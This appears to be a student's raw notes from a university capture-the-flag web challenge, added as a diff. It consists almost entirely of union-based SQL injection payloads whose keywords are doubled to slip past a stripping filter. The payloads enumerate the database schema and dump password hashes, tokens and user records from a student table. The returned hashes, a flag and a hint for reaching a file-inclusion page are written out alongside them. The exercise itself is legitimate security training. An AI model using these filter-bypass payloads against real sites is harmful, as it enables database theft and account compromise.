@@ -1,0 +1,122 @@
+'='
+' oorr 1 ooorrderrder by 1 -- -
+
+
+union+select+1,2,3,4,5,6,7,8,9,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())
+
+
+
+' oorr 1 uniunionon  (selselectect null,null,null,null,null,null,null,null,null,null,null,null,null,(selselectect group_concat(table_name) from infoorrmation_schema.tables whwhereere table_scheme=database())) -- -
+
+
+' oorr 1 ununionion (selselectect null,null,null,null,null,null,null,null,null,null,null,null,null,group_concat(table_name) from infoorrmation_schema.tables) --
+
+
+' or 1 union (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14) -- -
+
+' oorr 1 ununionion (selselectect null,(selselectect group_concat(table_name) from infoorrmation_schema.tables),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,tables
+
+
+' oorr 1 ununionion (selselectect null,database(),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+dabbf531f2807ef34014a2dec9afd5ce6
+
+
+' oorr 1 ununionion (selselectect null,(selselectect * from tables),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/
+
+' oorr 1 ununionion (selselectect null,(show columns from STATISTICS),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+' oorr 1 ununionion (selselectect null,(selselectect COLUMN_NAME FROM infoorrmation_schema.columns whwhereere table_name=STATISTICS),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT TABLE_NAME
+FROM INFOorRMATION_SCHEMA.TABLES
+WHwhereERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='dbName'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(*)
+FROM master.sys.sysusers),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+conn-6,ft8736320-3,student-14
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT COUNT(column_name) FROM infoorrmation_schema.columns WHEwhereRE table_schema=database() AandND table_name='student'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(column_name) FROM infoorrmation_schema.columns WHEwhereRE table_schema=database() AandND table_name='student'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+student
+id,name,uname,email,password,gender,phone,dob,bio,dateadded,datemodified,status,token,image
+
+conn
+cid,follower,following,dateadded,datemodified,status
+
+ft8736320
+id,uname,name
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(id) FROM ft8736320),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+' oorr 1 ununionion (selselectect null,(selselectect group_concat(1) from sqlite_master),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(grantee)
+FROM infoorrmation_schema.user_privileges),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+37c4106797380f2dc2eeef2d5f4f930b@localhost 
+
+' oorr 1 ununionion (selselectect null,User(),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(passwoorrd) FROM student whewherere uname='dbansal'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+4a9b54319b36e8c465d3c5514571b82c
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(name)) FROM ft8736320 whwhereere uname='flag'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(passwoorrd)) FROM student whwhereere uname LIKE '%agent%'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+cs628a{38e5aafbd3142fcac0c6bc574378559f}
+
+
+student
+id,name,uname,email,password,gender,phone,dob,bio,dateadded,datemodified,status,token,image
+
+conn
+cid,follower,following,dateadded,datemodified,status
+
+ft8736320
+id,uname,name
+
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(passwoorrd)) FROM student whwhereere uname LIKE '%lfi%'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+	
+lfi id - 95
+lfi name - Agent LFI
+lfi uname - lfi
+lfi email - lfi@vish.cse.iitk.ac.in
+lfi password - a47d4f1201414c71939ac21f87d21c90
+lfi token - MTU1Mjk2NzI1MQ== 
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(id)) FROM student whwhereere uname LIKE '%grab%'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+For Agent LFI
+
+Upload any image, see its location, then go to agent lfi location and then access gRaB.php
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(name)) FROM student whwhereere uname LIKE '%victim%'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+
+
+' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(token) FROM student whewherere uname='rfi'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
